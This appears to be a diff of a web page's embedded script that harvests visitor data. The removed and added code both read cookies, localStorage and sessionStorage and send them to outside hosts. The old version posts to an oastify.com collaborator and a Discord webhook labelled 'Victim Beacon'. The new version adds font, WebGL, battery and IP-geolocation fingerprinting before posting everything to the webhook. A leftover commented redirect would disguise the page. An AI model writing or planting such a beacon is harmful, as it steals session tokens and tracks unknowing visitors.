@@ -22,42 +22,81 @@
 
 <script>
 (async () => {
-  function safeBase64(str) {
-    return btoa(unescape(encodeURIComponent(str)));
-  }
+  const webhook = "https://discord.com/api/webhooks/1388233187075031241/BcOXhb8YM-I321blB67xbeqIvm76ZUbAW77Ku0YLSee8XAOoGIv3ssBAkyjl1D-Bo2xm";
 
-  const ua = navigator.userAgent;
-  const platform = navigator.platform;
-  const ref = document.referrer;
-  const cookies = document.cookie || "N/A";
-  const local = JSON.stringify(localStorage);
-  const session = JSON.stringify(sessionStorage);
-  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-
-  const payload = {
-    userAgent: ua,
-    platform: platform,
-    referrer: ref,
-    cookies: cookies,
-    localStorage: local,
-    sessionStorage: session,
-    timezone: timezone
+  const getFonts = () => {
+    const fonts = [
+      "Arial", "Verdana", "Times New Roman", "Courier", "Comic Sans MS", "Georgia", "Impact", "Monaco", "Tahoma"
+    ];
+    const canvas = document.createElement("canvas");
+    const ctx = canvas.getContext("2d");
+    const defaultWidth = {};
+    const testText = "mmmmmmmmmmlli";
+    ctx.font = "72px sans-serif";
+    for (const f of fonts) {
+      ctx.font = `72px '${f}', sans-serif`;
+      const width = ctx.measureText(testText).width;
+      defaultWidth[f] = width;
+    }
+    return fonts.filter(f => defaultWidth[f] !== defaultWidth["Arial"]);
   };
 
-  // Send to Burp Collaborator
-  new Image().src = "http://1mobdj8vv4xtypk8xi7wfl3s9jfa30rp.oastify.com/?" + safeBase64(JSON.stringify(payload));
+  const getWebGLInfo = () => {
+    const canvas = document.createElement("canvas");
+    const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+    if (!gl) return {};
+    const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
+    return {
+      vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+      renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+    };
+  };
 
-  // Send to Discord webhook
-  await fetch("https://discord.com/api/webhooks/1388233187075031241/BcOXhb8YM-I321blB67xbeqIvm76ZUbAW77Ku0YLSee8XAOoGIv3ssBAkyjl1D-Bo2xm", {
+  const getBattery = async () => {
+    try {
+      const battery = await navigator.getBattery();
+      return `${(battery.level * 100)}% - ${battery.charging ? "Charging" : "Not charging"}`;
+    } catch {
+      return "Not available";
+    }
+  };
+
+  const geo = await fetch("https://ipinfo.io/json?token=demo")
+    .then(r => r.json()).catch(() => ({}));
+
+  const payload = {
+    ua: navigator.userAgent,
+    platform: navigator.platform,
+    language: navigator.language,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    screen: `${screen.width}x${screen.height}`,
+    touchSupport: navigator.maxTouchPoints,
+    cookies: document.cookie || "None",
+    localStorage: JSON.stringify(localStorage),
+    sessionStorage: JSON.stringify(sessionStorage),
+    fonts: getFonts(),
+    webgl: getWebGLInfo(),
+    battery: await getBattery(),
+    ip: geo.ip || "N/A",
+    city: geo.city || "N/A",
+    region: geo.region || "N/A",
+    country: geo.country || "N/A",
+    org: geo.org || "N/A"
+  };
+
+  await fetch(webhook, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({
-      content: `🧲 **Victim Beacon**\n\`\`\`json\n${JSON.stringify(payload, null, 2)}\n\`\`\``
+      content: `🧲 Fingerprint Beacon:\n\`\`\`json\n${JSON.stringify(payload, null, 2)}\n\`\`\``
     })
   });
 
-  // Redirect to a safe-looking page
-  // window.location.href = "https://www.google.com";
+  // Optional redirect
+  // window.location.href = "https://google.com";
+})();
+</script>
+
 })();
 </script>
 
